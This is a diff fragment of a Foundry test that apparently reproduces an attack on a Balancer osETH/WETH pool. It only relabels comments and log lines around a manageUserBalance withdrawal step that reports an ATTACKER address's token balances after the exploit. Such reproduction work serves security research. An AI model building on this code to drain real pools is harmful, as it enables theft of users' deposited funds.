@@ -300,7 +300,7 @@ contract BalancerOsEthWethPoolTest is Test {
 
         console.log("Additional swaps:", additionalSwaps);
 
-        // WITHDRAWAL VIA manageUserBalance()
+        // withdraw manageUserBalance()
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(address(WETH));
         internalTokens[1] = IERC20(osETH_WETH_BPT);
@@ -363,13 +363,13 @@ contract BalancerOsEthWethPoolTest is Test {
             console.log("manageUserBalance executed!");
             console.log("Operations executed:", opsCount);
 
-            console.log("Attacker wallet balances AFTER:");
+            console.log("ATTACKER BALANCE AFTER:");
             console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
             console.log("  BPT:", IERC20(osETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
             console.log("  osETH:", IERC20(osETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
             uint256[] memory internalBalancesAfter = VAULT.getInternalBalance(ATTACKER, internalTokens);
-            console.log("Vault internal balances AFTER:");
+            console.log("VAULT BALANCE AFTER:");
             console.log("  Internal WETH:", internalBalancesAfter[0], "wei");
             console.log("  Internal BPT:", internalBalancesAfter[1], "wei");
             console.log("  Internal osETH:", internalBalancesAfter[2], "wei");
